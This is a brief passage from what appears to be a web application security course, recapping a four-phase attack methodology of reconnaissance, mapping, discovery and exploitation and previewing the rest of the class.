We have also reviewed the four-step attach methodology, which includes reconnaissance, mapping, discovery and exploitation phases. During the remainder of the class, we will closely examine the four steps of the attack and figure out ways to push the boundaries of web applications. 

We hope that you will enjoy the process as much as we enjoy sharing it with you.

